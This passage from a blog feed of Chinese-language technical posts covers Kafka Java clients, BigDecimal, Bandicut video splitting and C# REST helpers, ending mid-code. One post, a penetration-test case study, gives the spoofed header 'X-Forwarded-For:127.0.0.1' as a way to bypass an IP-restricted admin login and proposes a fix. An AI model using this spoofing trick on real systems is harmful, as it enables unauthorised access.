    <content><![CDATA[<h3 id="ApacheKafka-Java"><a href="#ApacheKafka-Java" class="headerlink" title="ApacheKafka-Java"></a>ApacheKafka-Java</h3><span id="more"></span>
<p>這篇介紹如何使用Java語言開發Kafka相關功能。</p>
<h3 id="Maven-add-org-apache-kafka-kafka-clients"><a href="#Maven-add-org-apache-kafka-kafka-clients" class="headerlink" title="Maven add org.apache.kafka (kafka-clients)"></a>Maven add org.apache.kafka (kafka-clients)</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.apache.kafka&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;kafka-clients&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;2.3.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Producer-Example"><a href="#Producer-Example" class="headerlink" title="Producer Example"></a>Producer Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">private static String bootstrapServers = <span class="string">&quot;server_xxx:9487&quot;</span>;</span><br><span class="line"></span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line"> /**</span><br><span class="line">  * create Producer properties</span><br><span class="line">  *</span><br><span class="line">  * Properties are available <span class="keyword">in</span> official document:</span><br><span class="line">  * https://kafka.apache.org/documentation/<span class="comment">#producerconfigs</span></span><br><span class="line">  *</span><br><span class="line">  */</span><br><span class="line"> Properties properties = new Properties();</span><br><span class="line"> properties.setProperty(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);</span><br><span class="line"> properties.setProperty(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());</span><br><span class="line"> properties.setProperty(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG,StringSerializer.class.getName());</span><br><span class="line"></span><br><span class="line"> // create the producer</span><br><span class="line"> KafkaProducer&lt;String, String&gt; produer = new KafkaProducer&lt;String, String&gt;(properties);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> // create a producer record</span><br><span class="line"> ProducerRecord&lt;String, String&gt; record =</span><br><span class="line">		 new ProducerRecord&lt;String, String&gt;(<span class="string">&quot;first_topic&quot;</span>, <span class="string">&quot;message from java&quot;</span>);</span><br><span class="line"></span><br><span class="line"> // send data - asynchronous</span><br><span class="line"> /**</span><br><span class="line">  *  asynchronous means the data would not send immediately</span><br><span class="line">  *  however, the program would terminate immediately after run the send() method</span><br><span class="line">  *  hence the data would not send to kafka topic</span><br><span class="line">  *  and the consumer would not receive the data</span><br><span class="line">  *</span><br><span class="line">  *  so we need flush()</span><br><span class="line">  */</span><br><span class="line"> produer.send(record);</span><br><span class="line"></span><br><span class="line"> /**</span><br><span class="line">  *  use flush() to <span class="built_in">wait</span> sending complete</span><br><span class="line">  */</span><br><span class="line"> produer.flush();</span><br><span class="line"> produer.close();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="有callback的Producer-Example"><a href="#有callback的Producer-Example" class="headerlink" title="有callback的Producer Example"></a>有callback的Producer Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * send data with Callback()</span><br><span class="line"> */</span><br><span class="line"><span class="keyword">for</span>(int i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">    // create a producer record</span><br><span class="line">    ProducerRecord&lt;String, String&gt; record =</span><br><span class="line">            new ProducerRecord&lt;String, String&gt;(<span class="string">&quot;first_topic&quot;</span>, <span class="string">&quot;message from java&quot;</span> + Integer.toString(i));</span><br><span class="line"></span><br><span class="line">    produer.send(record, new <span class="function"><span class="title">Callback</span></span>() &#123;</span><br><span class="line">        public void onCompletion(RecordMetadata recordMetadata, Exception e) &#123;</span><br><span class="line">            // execute every time a record is successfully sent or an exception is thrown</span><br><span class="line">            <span class="keyword">if</span> (e == null) &#123;</span><br><span class="line">                // the record is sent successfully</span><br><span class="line">                logger.info(<span class="string">&quot;Received new metadata. \n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;Topic: &quot;</span> + recordMetadata.topic() + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;Partition: &quot;</span> + recordMetadata.partition() + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;Offset: &quot;</span> + recordMetadata.offset() + <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;Timestamp: &quot;</span> + recordMetadata.timestamp());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                LogUtils.logger.error(<span class="string">&quot;Error while producing&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="send-ProducerRecord-with-key"><a href="#send-ProducerRecord-with-key" class="headerlink" title="send ProducerRecord with key"></a>send ProducerRecord with key</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">String key = <span class="string">&quot;id_&quot;</span> + Integer.toString(i);</span><br><span class="line"></span><br><span class="line">ProducerRecord&lt;String, String&gt; record =</span><br><span class="line">        new ProducerRecord&lt;String, String&gt;(topic, key,<span class="string">&quot;message from java&quot;</span> + Integer.toString(i));</span><br></pre></td></tr></table></figure>

<h3 id="Consumer-Example"><a href="#Consumer-Example" class="headerlink" title="Consumer Example"></a>Consumer Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">private static String bootstrapServers = <span class="string">&quot;server:9092&quot;</span>;</span><br><span class="line">private static String groupId = <span class="string">&quot;my-forth-app&quot;</span>;</span><br><span class="line">private static String topic = <span class="string">&quot;first_topic&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line"> Logger logger = LoggerFactory.getLogger(ConsumerDemo.class);</span><br><span class="line"></span><br><span class="line"> /**</span><br><span class="line">  * create Consumer properties</span><br><span class="line">  *</span><br><span class="line">  * Properties are available <span class="keyword">in</span> official document:</span><br><span class="line">  * https://kafka.apache.org/documentation/<span class="comment">#consumerconfigs</span></span><br><span class="line">  *</span><br><span class="line">  */</span><br><span class="line"> Properties properties = new Properties();</span><br><span class="line"> properties.setProperty(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);</span><br><span class="line"> properties.setProperty(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());</span><br><span class="line"> properties.setProperty(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());</span><br><span class="line"> properties.setProperty(ConsumerConfig.GROUP_ID_CONFIG, groupId);</span><br><span class="line"> properties.setProperty(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, <span class="string">&quot;earliest&quot;</span>);</span><br><span class="line"></span><br><span class="line"> // create consumer</span><br><span class="line"> KafkaConsumer&lt;String, String&gt; consumer = new KafkaConsumer&lt;String, String&gt;(properties);</span><br><span class="line"></span><br><span class="line"> // subscribe consumer to our topic(s)</span><br><span class="line"> consumer.subscribe(Arrays.asList(topic));</span><br><span class="line"></span><br><span class="line"> // poll <span class="keyword">for</span> new data</span><br><span class="line"> <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">	 ConsumerRecords&lt;String, String&gt; records =</span><br><span class="line">			 consumer.poll(Duration.ofMinutes(100));</span><br><span class="line"></span><br><span class="line">	 <span class="keyword">for</span>(ConsumerRecord record : records)&#123;</span><br><span class="line">		 logger.info(<span class="string">&quot;Key: &quot;</span> + record.key() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;Value: &quot;</span> + record.value() +</span><br><span class="line">				 <span class="string">&quot;Topic: &quot;</span> + record.partition() + <span class="string">&quot;\t&quot;</span> + <span class="string">&quot;Partition: &quot;</span> + record.partition()</span><br><span class="line">		);</span><br><span class="line"></span><br><span class="line">	 &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>ApacheKafka</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Broken Authentication</title>
    <url>/posts/920425ad/</url>
    <content><![CDATA[<h3 id="Intro-Broken-Authentication"><a href="#Intro-Broken-Authentication" class="headerlink" title="Intro Broken Authentication"></a>Intro Broken Authentication</h3><span id="more"></span>
<p>這篇介紹Broken Authentication，它是一個資訊安全滲透測試的issue。</p>
<h3 id="Case-Study"><a href="#Case-Study" class="headerlink" title="Case Study"></a>Case Study</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">API未對用戶端傳送之HTTP Header進行過濾，導致hacker可藉由竄改HTTP Header</span><br><span class="line">(ex:於HTTP Header 加入 X-Forwarded-For變數)，可繞過後端IP偵測，存取管理</span><br><span class="line">登入頁面。甚至可以竄改 Header 插入特殊字元，對網站進行SQL Injection或</span><br><span class="line">Cross-Site Scripting攻擊。</span><br></pre></td></tr></table></figure>

<h3 id="攻擊手法"><a href="#攻擊手法" class="headerlink" title="攻擊手法"></a>攻擊手法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在HTTP request新增 X-Forwarded-For:127.0.0.1 Header，即可繞過IP限制登入系統。</span><br></pre></td></tr></table></figure>

<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在檢查IP時，針對IPv4 Private IP Address限制存取。</span><br><span class="line"></span><br><span class="line">IPv4的私有IP定義在RFC 1918</span><br><span class="line"></span><br><span class="line">24位元區塊	10.0.0.0 – 10.255.255.255</span><br><span class="line">20位區塊	172.16.0.0 – 172.31.255.255</span><br><span class="line">16位元區塊	192.168.0.0 – 192.168.255.255</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Information Security</category>
      </categories>
      <tags>
        <tag>Information Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Bandicut分割影片軟體</title>
    <url>/posts/d92e977c/</url>
    <content><![CDATA[<h3 id="Bandicut分割影片軟體"><a href="#Bandicut分割影片軟體" class="headerlink" title="Bandicut分割影片軟體"></a>Bandicut分割影片軟體</h3><span id="more"></span>
<p>最近有分割mp4影片的需求，之前使用過Mp4Split軟體做影片分割。<br>功能簡單但只有用多少秒分割一個影片的選項，自己仍需要去計算<br>多少秒分割一個影片，最近找到Bandicut這個軟體，它提供一個可以<br>一部影片分割多少部影片的選項。是一個更好的影片分割軟體的選擇。</p>
<h3 id="官方網站下載"><a href="#官方網站下載" class="headerlink" title="官方網站下載"></a>官方網站下載</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">https://www.bandicam.com/bandicut-video-cutter/tw/</span><br></pre></td></tr></table></figure>

<h3 id="免費版開啟有修剪、分割、合併三個功能"><a href="#免費版開啟有修剪、分割、合併三個功能" class="headerlink" title="免費版開啟有修剪、分割、合併三個功能"></a>免費版開啟有修剪、分割、合併三個功能</h3><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/Bandicut-1.PNG" width="50%" />

<h3 id="點選分割後，選擇檔案會出現需要分割影片的數量"><a href="#點選分割後，選擇檔案會出現需要分割影片的數量" class="headerlink" title="點選分割後，選擇檔案會出現需要分割影片的數量"></a>點選分割後，選擇檔案會出現需要分割影片的數量</h3><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/Bandicut-2.PNG" width="50%" />

<h3 id="再點選兩個開始後，影片就開始分割"><a href="#再點選兩個開始後，影片就開始分割" class="headerlink" title="再點選兩個開始後，影片就開始分割"></a>再點選兩個開始後，影片就開始分割</h3><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/Bandicut-3.PNG" width="50%" />]]></content>
      <categories>
        <category>Bandicut</category>
      </categories>
      <tags>
        <tag>SplitVideo</tag>
      </tags>
  </entry>
  <entry>
    <title>Java math BigDecimal toPlainString()</title>
    <url>/posts/f0e81a4b/</url>
    <content><![CDATA[<h3 id="Java-math-BigDecimal-toPlainString"><a href="#Java-math-BigDecimal-toPlainString" class="headerlink" title="Java.math.BigDecimal.toPlainString()"></a>Java.math.BigDecimal.toPlainString()</h3><span id="more"></span>
<p>java.math.BigDecimal.toPlainString() 返回此BigDecimal的字符串表示形式不帶指數字段。<br>為具有正的精度值，中位數的小數點右邊的數字用於指示精度。</p>
<h3 id="method-宣告"><a href="#method-宣告" class="headerlink" title="method 宣告"></a>method 宣告</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public String toPlainString()</span><br></pre></td></tr></table></figure>

<h3 id="BigDecimal-toPlainString-Example"><a href="#BigDecimal-toPlainString-Example" class="headerlink" title="BigDecimal.toPlainString() Example"></a>BigDecimal.toPlainString() Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public class BigDecimalDemo &#123;</span><br><span class="line"></span><br><span class="line">     public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        // create a BigDecimal object</span><br><span class="line">        BigDecimal <span class="built_in">bg</span>;</span><br><span class="line"></span><br><span class="line">        // create a String object</span><br><span class="line">        String s;</span><br><span class="line"></span><br><span class="line">		MathContext mc = new MathContext(3); // 3 precision</span><br><span class="line"></span><br><span class="line">        <span class="built_in">bg</span> = new BigDecimal(<span class="string">&quot;1234E+4&quot;</span>,mc);</span><br><span class="line"></span><br><span class="line">        // assign the plain string value of <span class="built_in">bg</span> to s</span><br><span class="line">        s = bg.toPlainString();</span><br><span class="line"></span><br><span class="line">		String str = <span class="string">&quot;Plain string value of &quot;</span> + <span class="built_in">bg</span> + <span class="string">&quot; is &quot;</span> + s;</span><br><span class="line"></span><br><span class="line">        // <span class="built_in">print</span> s value</span><br><span class="line">        System.out.println( str );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Plain string value of 1.23E+7 is 12300000</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>BigDecimal</tag>
      </tags>
  </entry>
  <entry>
    <title>C#使用Restful Api : GET</title>
    <url>/posts/4febe386/</url>
    <content><![CDATA[<h3 id="C-使用Restful-Api-GET"><a href="#C-使用Restful-Api-GET" class="headerlink" title="C#使用Restful Api : GET"></a>C#使用Restful Api : GET</h3><span id="more"></span>
<p>GET方法，沒有傳入參數。僅有URL、timeOut</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public static void GET(string url, int timeOut)</span><br><span class="line">&#123;</span><br><span class="line">	HttpWebResponse response;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		// 使用 HttpWebRequest.Create 實際上也是呼叫 WebRequest.Create</span><br><span class="line">		WebRequest request = WebRequest.Create(url);</span><br><span class="line">		//指定 request 使用的 http verb</span><br><span class="line">		request.Method = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">		request.Timeout = timeOut;</span><br><span class="line">		//使用 GetResponse 方法將 request 送出，如果不是用 using 包覆，請記得手動 close WebResponse 物件，避免連線持續被佔用而無法送出新的 request</span><br><span class="line">		response = (HttpWebResponse)request.GetResponse();</span><br><span class="line">	&#125;</span><br><span class="line">	catch (WebException ex)</span><br><span class="line">	&#123;</span><br><span class="line">		LogUtil.logger.Error(Convert.ToString(ex));</span><br><span class="line">		//網站回應錯誤,</span><br><span class="line">		_ = (HttpWebResponse)ex.Response;</span><br><span class="line">		<span class="built_in">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (response != null)</span><br><span class="line">	&#123;</span><br><span class="line">		response.Close();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GET方法，有傳入參數。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public static byte[] GET(string url, NameValueCollection values)</span><br><span class="line">&#123;</span><br><span class="line">	HttpWebResponse response;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		var queryString = ToQueryString(values);</span><br><span class="line">		LogUtil.logger.Debug(<span class="string">&quot;queryString:&quot;</span> + queryString);</span><br><span class="line">		var request = WebRequest.Create(url + queryString);</span><br><span class="line">		request.Method = <span class="string">&quot;GET&quot;</span>;</span><br><span class="line">		request.Timeout = timeout_5;</span><br><span class="line">		response = (HttpWebResponse)request.GetResponse();</span><br><span class="line">	&#125;</span><br><span class="line">	catch (WebException ex)</span><br><span class="line">	&#123;</span><br><span class="line">		LogUtil.logger.Error(Convert.ToString(ex));</span><br><span class="line">		//網站回應錯誤,</span><br><span class="line">		_ = (HttpWebResponse)ex.Response;</span><br><span class="line">		<span class="built_in">return</span> null;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (response != null)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (response.StatusCode == HttpStatusCode.OK)</span><br><span class="line">		&#123;</span><br><span class="line">			using (var responseStream = response.GetResponseStream())</span><br><span class="line">			using (var stream = new MemoryStream())</span><br><span class="line">			&#123;</span><br><span class="line">				responseStream.CopyTo(stream);</span><br><span class="line">				<span class="built_in">return</span> stream.ToArray();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		response.Close();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private static string ToQueryString(NameValueCollection col)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">return</span> string.Join(<span class="string">&quot;&amp;&quot;</span>, col.AllKeys.Select(key =&gt; string.Format(<span class="string">&quot;&#123;0&#125;=&#123;1&#125;&quot;</span>, HttpUtility.UrlEncode(key), HttpUtility.UrlEncode(col[key]))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>CSharp</tag>
        <tag>RestFul Api</tag>
        <tag>GET</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Kafka核心概念</title>
    <url>/posts/f8bd17dc/</url>
    <content><![CDATA[<h3 id="Apache-Kafka"><a href="#Apache-Kafka" class="headerlink" title="Apache Kafka"></a>Apache Kafka</h3><span id="more"></span>
<p>Kafka是由Apache軟體基金會開發的一個開源流處理平台，由Scala和Java編寫。<br>該專案的目標是為處理即時資料提供一個統一、高吞吐、低延遲的平台。<br>Kafka 主要有以下幾個核心名詞:</p>
<h3 id="Topics"><a href="#Topics" class="headerlink" title="Topics"></a>Topics</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在 Kafka 中 topic 就像是 database 中的 table，為不同資料的類別名稱。</span><br></pre></td></tr></table></figure>

<h3 id="Partitions"><a href="#Partitions" class="headerlink" title="Partitions"></a>Partitions</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Topic 內切分為數個 Partitions，在 Kafka 中每個最小單位的訊息 (message) 或記錄 (record) </span><br><span class="line">以序列 append 的方式存放在在每個 Partition 中，Partition 可以分散式的存放在不同機器中，以防止單台機器故障。</span><br></pre></td></tr></table></figure>

<h3 id="Producers-and-Consumers"><a href="#Producers-and-Consumers" class="headerlink" title="Producers and Consumers"></a>Producers and Consumers</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Producers 與 Consumers 分別對應 publish/subscribe 系統的概念，</span><br><span class="line">Producers 可以新增資料到 topic，Consumers 負責從資料讀取 topic。</span><br></pre></td></tr></table></figure>
<img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/KafkaProducersConsumer.PNG" width="50%" />



<h3 id="Brokers-and-Clusters"><a href="#Brokers-and-Clusters" class="headerlink" title="Brokers and Clusters"></a>Brokers and Clusters</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">一個單台 Kafka server 稱為 broker，每個 broker 接收來自 producers 的訊並寫入至磁碟中，同時回應來自 Consumers 的資料請求。</span><br><span class="line">多個 Brokers 連接在一起稱之為 Cluster，Cluster 中存在一個 controller （動態建立），負責分配 partitions 與監控 brokers 狀態。</span><br></pre></td></tr></table></figure>
<img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/brokerAndCluster.png" width="50%" />

<h3 id="Retention"><a href="#Retention" class="headerlink" title="Retention"></a>Retention</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Retention 是指 Kafka 可以設定的存放在磁碟中的一段時間，預設是 7 天或是資料量大於 1 GB 就會自動刪除一些資料。</span><br><span class="line">Kafka 可以針對不同 topic 設定不同 Retention。</span><br></pre></td></tr></table></figure>

<h3 id="Multiple-Clusters"><a href="#Multiple-Clusters" class="headerlink" title="Multiple Clusters"></a>Multiple Clusters</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Kafka 支援 Multiple Clusters，主要是為了可以提高可用性與安全性，</span><br><span class="line">如建立cluster 於不同的資料中心，並提供了稱之為 MirrorMaker 的工具讓你輕易在 clusters 之間複製資料。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ApacheKafka</category>
      </categories>
      <tags>
        <tag>ApacheKafka</tag>
      </tags>
  </entry>
  <entry>
    <title>C#使用Restful Api : POST</title>
    <url>/posts/3588cba1/</url>
    <content><![CDATA[<h3 id="C-使用Restful-Api-POST"><a href="#C-使用Restful-Api-POST" class="headerlink" title="C#使用Restful Api : POST"></a>C#使用Restful Api : POST</h3><span id="more"></span>
<p>POST方法，有傳入參數、URL、timeOut。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public static byte[] POST(string url, NameValueCollection values, int timeOut)</span><br><span class="line">&#123;</span><br><span class="line">	var request = WebRequest.Create(url);</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		request.Method = <span class="string">&quot;POST&quot;</span>;</span><br><span class="line">		request.Timeout = timeOut;</span><br><span class="line">		var boundary = <span class="string">&quot;---------------------------&quot;</span> + DateTime.Now.Ticks.ToString(<span class="string">&quot;x&quot;</span>, NumberFormatInfo.InvariantInfo);</span><br><span class="line">		request.ContentType = <span class="string">&quot;multipart/form-data; boundary=&quot;</span> + boundary;</span><br><span class="line">		boundary = <span class="string">&quot;--&quot;</span> + boundary;</span><br><span class="line"></span><br><span class="line">		using (var requestStream = request.GetRequestStream())</span><br><span class="line">		&#123;</span><br><span class="line">			// Write the values</span><br><span class="line">			foreach (string name <span class="keyword">in</span> values.Keys)</span><br><span class="line">			&#123;</span><br><span class="line">				var buffer = Encoding.ASCII.GetBytes(boundary + Environment.NewLine);</span><br><span class="line">				requestStream.Write(buffer, 0, buffer.Length);</span><br><span class="line">				buffer = Encoding.ASCII.GetBytes(string.Format(<span class="string">&quot;Content-Disposition: form-data; name=\&quot;&#123;0&#125;\&quot;&#123;1&#125;&#123;1&#125;&quot;</span>, name, Environment.NewLine));</span><br><span class="line">				requestStream.Write(buffer, 0, buffer.Length);</span><br><span class="line">				buffer = Encoding.UTF8.GetBytes(values[name] + Environment.NewLine);</span><br><span class="line">				requestStream.Write(buffer, 0, buffer.Length);</span><br><span class="line">			&#125;</span><br><span class="line">			var boundaryBuffer = Encoding.ASCII.GetBytes(boundary + <span class="string">&quot;--&quot;</span>);</span><br><span class="line">			requestStream.Write(boundaryBuffer, 0, boundaryBuffer.Length);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	catch (Exception ex)</span><br><span class="line">	&#123;</span><br><span class="line">		LogUtil.logger.Error(Convert.ToString(ex));</span><br><span class="line">		<span class="built_in">return</span> null;</span><br><span class="line">	&#125;</span><br><span class="line">	HttpWebResponse response;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		response = (HttpWebResponse)request.GetResponse();</span><br><span class="line">	&#125;</span><br><span class="line">	catch (WebException ex)</span><br><span class="line">	&#123;</span><br><span class="line">		LogUtil.logger.Error(Convert.ToString(ex));</span><br><span class="line">		//網站回應錯誤,</span><br><span class="line">		_ = (HttpWebResponse)ex.Response;</span><br><span class="line">		<span class="built_in">return</span> null;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (response != null)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (response.StatusCode == HttpStatusCode.OK)</span><br><span class="line">		&#123;</span><br><span class="line">			using (var responseStream = response.GetResponseStream())</span><br><span class="line">			using (var stream = new MemoryStream())</span><br><span class="line">			&#123;</span><br><span class="line">				responseStream.CopyTo(stream);</span><br><span class="line">				<span class="built_in">return</span> stream.ToArray();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		response.Close();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>POST方法，有傳入參數、圖片檔案、URL、timeOut。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public static byte[] UploadFilesByPost(string url, IEnumerable&lt;UploadFile&gt; files, NameValueCollection values)</span><br><span class="line">&#123;</span><br><span class="line">	var request = WebRequest.Create(url);</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		request.Method = <span class="string">&quot;POST&quot;</span>;</span><br><span class="line">		request.Timeout = 5000;</span><br><span class="line">		var boundary = <span class="string">&quot;---------------------------&quot;</span> + DateTime.Now.Ticks.ToString(<span class="string">&quot;x&quot;</span>, NumberFormatInfo.InvariantInfo);</span><br><span class="line">		request.ContentType = <span class="string">&quot;multipart/form-data; boundary=&quot;</span> + boundary;</span><br><span class="line">		boundary = <span class="string">&quot;--&quot;</span> + boundary;</span><br><span class="line"></span><br><span class="line">		using (var requestStream = request.GetRequestStream())</span><br><span class="line">		&#123;</span><br><span class="line">			// Write the values</span><br><span class="line">			foreach (string name <span class="keyword">in</span> values.Keys)</span><br><span class="line">			&#123;</span><br><span class="line">				var buffer = Encoding.ASCII.GetBytes(boundary + Environment.NewLine);</span><br><span class="line">				requestStream.Write(buffer, 0, buffer.Length);</span><br><span class="line">				buffer = Encoding.ASCII.GetBytes(string.Format(<span class="string">&quot;Content-Disposition: form-data; name=\&quot;&#123;0&#125;\&quot;&#123;1&#125;&#123;1&#125;&quot;</span>, name, Environment.NewLine));</span><br><span class="line">				requestStream.Write(buffer, 0, buffer.Length);</span><br><span class="line">				buffer = Encoding.UTF8.GetBytes(values[name] + Environment.NewLine);</span><br><span class="line">				requestStream.Write(buffer, 0, buffer.Length);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (files != null)</span><br><span class="line">			&#123;</span><br><span class="line">				// Write the files</span><br><span class="line">				foreach (var file <span class="keyword">in</span> files)</span><br><span class="line">				&#123;</span><br><span class="line">					var buffer = Encoding.ASCII.GetBytes(boundary + Environment.NewLine);</span><br><span class="line">					requestStream.Write(buffer, 0, buffer.Length);</span><br><span class="line">					buffer = Encoding.UTF8.GetBytes(string.Format(<span class="string">&quot;Content-Disposition: form-data; name=\&quot;&#123;0&#125;\&quot;; filename=\&quot;&#123;1&#125;\&quot;&#123;2&#125;&quot;</span>, file.Name, file.Filename, Environment.NewLine));</span><br><span class="line">					requestStream.Write(buffer, 0, buffer.Length);</span><br><span class="line">					buffer = Encoding.ASCII.GetBytes(string.Format(<span class="string">&quot;Content-Type: &#123;0&#125;&#123;1&#125;&#123;1&#125;&quot;</span>, file.ContentType, Environment.NewLine));</span><br><span class="line">					requestStream.Write(buffer, 0, buffer.Length);</span><br><span class="line">					file.Stream.CopyTo(requestStream);</span><br><span class="line">					buffer = Encoding.ASCII.GetBytes(Environment.NewLine);</span><br><span class="line">					requestStream.Write(buffer, 0, buffer.Length);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			var boundaryBuffer = Encoding.ASCII.GetBytes(boundary + <span class="string">&quot;--&quot;</span>);</span><br><span class="line">			requestStream.Write(boundaryBuffer, 0, boundaryBuffer.Length);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	catch (Exception ex)</span><br><span class="line">	&#123;</span><br><span class="line">		LogUtil.logger.Error(Convert.ToString(ex));</span><br><span class="line">		<span class="built_in">return</span> null;</span><br><span class="line">	&#125;</span><br><span class="line">	HttpWebResponse response;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		response = (HttpWebResponse)request.GetResponse();</span><br><span class="line">	&#125;</span><br><span class="line">	catch (WebException ex)</span><br><span class="line">	&#123;</span><br><span class="line">		LogUtil.logger.Error(Convert.ToString(ex));</span><br><span class="line">		//網站回應錯誤,</span><br><span class="line">		_ = (HttpWebResponse)ex.Response;</span><br><span class="line">		<span class="built_in">return</span> null;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (response != null)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (response.StatusCode == HttpStatusCode.OK)</span><br><span class="line">		&#123;</span><br><span class="line">			using (var responseStream = response.GetResponseStream())</span><br><span class="line">			using (var stream = new MemoryStream())</span><br><span class="line">			&#123;</span><br><span class="line">				responseStream.CopyTo(stream);</span><br><span class="line">				<span class="built_in">return</span> stream.ToArray();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		response.Close();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class UploadFile</span><br><span 